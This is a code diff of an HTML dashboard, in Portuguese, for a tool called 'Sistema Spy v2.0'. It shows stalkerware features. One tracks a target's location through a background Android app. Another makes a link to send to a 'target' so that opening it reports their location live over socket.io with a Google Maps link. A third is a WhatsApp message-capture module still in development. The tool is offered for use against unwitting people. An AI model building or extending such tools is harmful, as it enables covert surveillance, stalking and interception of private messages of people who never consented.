@@ -2,32 +2,112 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>SISTEMA CENTRAL</title>
-    <link rel="stylesheet" href="/css/style.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Central de Inteligência</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00ff88; --bg: #0f0f13; --card: #1a1a20; --text: #e0e0e0; }
+        body { margin: 0; font-family: 'Rajdhani', sans-serif; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        header { width: 100%; padding: 20px; text-align: center; border-bottom: 1px solid #333; background: #000; }
+        h1 { margin: 0; letter-spacing: 2px; text-transform: uppercase; color: var(--primary); }
+        
+        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; width: 90%; max-width: 1200px; margin-top: 40px; }
+        
+        .card { background: var(--card); border-radius: 12px; padding: 25px; border: 1px solid #333; transition: 0.3s; position: relative; overflow: hidden; }
+        .card:hover { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 255, 136, 0.1); }
+        
+        .card h2 { margin-top: 0; color: #fff; border-bottom: 2px solid var(--primary); display: inline-block; padding-bottom: 5px; }
+        .card p { color: #888; font-size: 0.9rem; }
+        
+        .btn { display: inline-block; width: 100%; padding: 12px; margin-top: 15px; background: transparent; border: 1px solid var(--primary); color: var(--primary); text-transform: uppercase; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; transition: 0.2s; border-radius: 5px; }
+        .btn:hover { background: var(--primary); color: #000; }
+
+        /* Estilo Específico do Módulo Link Rápido */
+        .live-status { margin-top: 15px; padding: 15px; background: #000; border-radius: 5px; font-family: monospace; font-size: 0.85rem; height: 100px; overflow-y: auto; color: #00ff88; border: 1px solid #333; }
+        .input-group { display: flex; gap: 10px; margin-top: 10px; }
+        .input-link { flex: 1; background: #000; border: 1px solid #444; color: #fff; padding: 10px; border-radius: 5px; }
+        
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.5; } }
+    </style>
 </head>
 <body>
-    <div class="home-container">
-        <h1 class="glitch-title red-glow">ACESSO DE<br>MONITORAMENTO</h1>
-        <p style="letter-spacing: 5px; margin-top: 10px;">SELECIONE O MÓDULO DE INVASÃO</p>
 
-        <div class="menu-grid">
-            <a href="/gps">
-                <div class="menu-item">
-                    <span><i class="fa-solid fa-map-location-dot"></i></span>
-                    <h2>ATIVAR GPS</h2>
-                    <p>Rastreamento Real-Time</p>
-                </div>
-            </a>
+    <header>
+        <h1>Sistema Spy v2.0</h1>
+    </header>
 
-            <a href="/zap">
-                <div class="menu-item">
-                    <span><i class="fa-brands fa-whatsapp"></i></span>
-                    <h2>ZAP CAPTURA</h2>
-                    <p>Interceptação de Dados</p>
-                </div>
-            </a>
+    <div class="container">
+        
+        <div class="card">
+            <h2>01. Rastreamento 24h</h2>
+            <p>Monitoramento contínuo via Aplicativo Android (Background Service).</p>
+            <div style="margin-top: 20px; font-size: 0.8rem; color: #666;">STATUS: <span style="color:var(--primary)">ATIVO</span></div>
+            <a href="/gps" class="btn">Abrir Mapa Completo</a>
         </div>
+
+        <div class="card">
+            <h2>02. Captura na Hora</h2>
+            <p>Envie o link. Ao clicar, a localização aparece aqui instantaneamente.</p>
+            
+            <div class="input-group">
+                <input type="text" id="meuLink" class="input-link" readonly value="Carregando...">
+                <button onclick="copiarLink()" class="btn" style="width: auto; margin:0;">Copiar</button>
+            </div>
+
+            <div id="live-console" class="live-status">
+                > Aguardando alvo abrir o link...
+            </div>
+            
+            <a id="btn-maps" href="#" target="_blank" class="btn" style="display:none; background: #222; border-color: #fff; color: #fff;">Ver no Google Maps</a>
+        </div>
+
+        <div class="card" style="opacity: 0.7;">
+            <h2>03. Módulo Zap</h2>
+            <p>Ferramenta de captura e espelhamento de mensagens.</p>
+            <div style="margin-top: 20px; font-size: 0.8rem; color: #666;">STATUS: <span style="color:orange">EM DESENVOLVIMENTO</span></div>
+            <a href="/zap" class="btn">Acessar Painel</a>
+        </div>
+
     </div>
+
+    <script>
+        const socket = io();
+        const consoleDiv = document.getElementById('live-console');
+        const linkInput = document.getElementById('meuLink');
+        
+        // Define o link automaticamente baseado na URL do site
+        linkInput.value = window.location.origin + "/verificar";
+
+        function copiarLink() {
+            navigator.clipboard.writeText(linkInput.value);
+            alert("Link copiado! Envie para o alvo.");
+        }
+
+        function log(msg, highlight=false) {
+            const time = new Date().toLocaleTimeString();
+            const color = highlight ? '#00ff88' : '#888';
+            consoleDiv.innerHTML = `<div style="color:${color}">[${time}] ${msg}</div>` + consoleDiv.innerHTML;
+        }
+
+        // Escuta o servidor. Se chegar dado do App ou do Link, mostra aqui
+        socket.on('gps_update', (data) => {
+            // Se vier do Link Web (provider: web_link), damos destaque
+            if(data.provider === 'web_link') {
+                log(`ALVO NO LINK! Lat: ${data.lat}, Long: ${data.lng}`, true);
+                
+                // Ativa o botão do Google Maps
+                const btn = document.getElementById('btn-maps');
+                btn.style.display = 'block';
+                btn.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
+                btn.classList.add('blink'); // Faz o botão piscar
+            } else {
+                // Se for do app android
+                log(`App Update (Moto): ${data.lat.toFixed(4)}, ${data.lng.toFixed(4)}`);
+            }
+        });
+    </script>
 </body>
 </html>
